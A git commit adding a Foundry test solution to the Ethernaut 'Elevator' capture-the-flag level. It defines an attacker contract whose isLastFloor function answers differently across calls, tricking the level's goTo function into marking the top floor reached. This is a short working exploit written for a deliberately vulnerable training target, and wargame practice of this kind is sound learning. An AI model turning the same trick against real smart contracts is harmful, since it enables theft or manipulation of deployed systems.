22e885d47bf97c2f60b975548ae68fb09a0d8ab9
oba <obatirou@gmail.com>
2023-04-21 17:31:48 +0200

    Level 11 Elevator: solution

--- src/test/Elevator.t.sol
+++ src/test/Elevator.t.sol
@@ -29,11 +29,35 @@ contract ElevatorTest is Test {
         // LEVEL ATTACK //
         //////////////////
 
+        // Create a contract that will inherint from Elevator
+        // The goal is to change the state variable floor and top from Elevator contract
+        // By implementing a isLastFloor function in the calling contract
+        // it is possible to enter the if condition from goTo function from Elevator contract
+        BuildingWithElevator buildingWithElevator = new BuildingWithElevator(ethernautElevator);
+        buildingWithElevator.callElevator();
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
+    }
+}
+
+contract BuildingWithElevator is Building {
+    uint256 constant lastFloor = uint256(2);
+    Elevator elevator;
+
+    constructor(Elevator _elevator) {
+        elevator = _elevator;
+    }
+
+    function isLastFloor(uint256 floor) external view returns (bool) {
+        return floor == elevator.floor();
+    }
+
+    function callElevator() external {
+        elevator.goTo(lastFloor);
     }
 }
